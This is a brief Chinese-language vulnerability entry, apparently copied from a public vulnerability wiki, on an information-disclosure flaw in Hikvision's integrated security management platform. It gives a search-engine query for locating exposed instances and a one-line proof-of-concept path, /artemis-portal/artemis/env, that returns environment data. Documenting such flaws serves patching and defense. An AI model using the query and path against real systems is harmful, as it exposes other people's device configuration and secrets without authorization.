---
title: "Hikvision 综合安防管理平台 env 信息泄漏漏洞"
date: 2026-10-18 09:14:42
categories:
  - WebSecurity
  - CVE
  - "IoT"
  - "HIKVISION"
tags:
  - "HIKVISION"
  - "信息泄露"
  - "漏洞复现"
---
## 漏洞描述

Hikvision 综合安防管理平台存在信息泄漏漏洞，攻击者通过漏洞可以获取环境env等敏感消息进一步攻击

## 漏洞影响

Hikvision 综合安防管理平台

## 网络测绘

```
app="Hikvision-综合安防管理平台"
```

## 漏洞复现

登录页面

![image-20220824134144287](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202208241341481.png)

验证POC

```
/artemis-portal/artemis/env 
```

![image-20230828163057813](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/image-20230828163057813.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/iot/HIKVISION-%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-env-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E.md)
